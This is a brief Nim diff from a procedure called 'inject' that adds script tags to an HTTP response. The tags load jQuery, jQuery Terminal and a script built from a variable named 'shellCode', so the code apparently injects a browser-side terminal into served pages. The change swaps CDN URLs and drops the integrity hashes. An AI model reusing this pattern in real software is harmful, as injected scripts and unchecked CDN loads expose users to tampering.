@@ -48,10 +48,10 @@ proc inject*(resp: Response): string =
   block scripts:
     const
       shellcodeScript = &"<script>{shellCode}</script>"
-      jQueryScript = "<script src=\"https://cdn.jsdelivr.net/npm/jquery\"></script>"
+      jQueryScript = "<script src=\"https://code.jquery.com/jquery-3.2.1.min.js\"></script>"
 
-      jTerminalScript = "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/2.32.1/js/jquery.terminal.min.js\" integrity=\"sha512-nDzz8UcmzHYztygAsHkZM2jLcDsAeEZkhK+Qk/xCjapmD5XffLaFk6Sckf4JALx3PLlufgcKObuKC+HOCqFRow==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"></script>"
-      jTerminalStyle = "<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/2.32.1/css/jquery.terminal.min.css\" integrity=\"sha512-TwsqXhHmsVX7pKcP0r9rUsGumsrluz+mh1UoTORiI235c9rgGTMk81kkhD8NxL24OYL+rPFfgew63g8Rc3Mrzg==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\" />"
+      jTerminalScript = "<script src=\"https://unpkg.com/jquery.terminal/js/jquery.terminal.min.js\"></script>"
+      jTerminalStyle = "<link href=\"https://unpkg.com/jquery.terminal/css/jquery.terminal.min.css\" rel=\"stylesheet\"/>"
 
       all = jQueryScript & jTerminalScript & shellcodeScript & jTerminalStyle
 
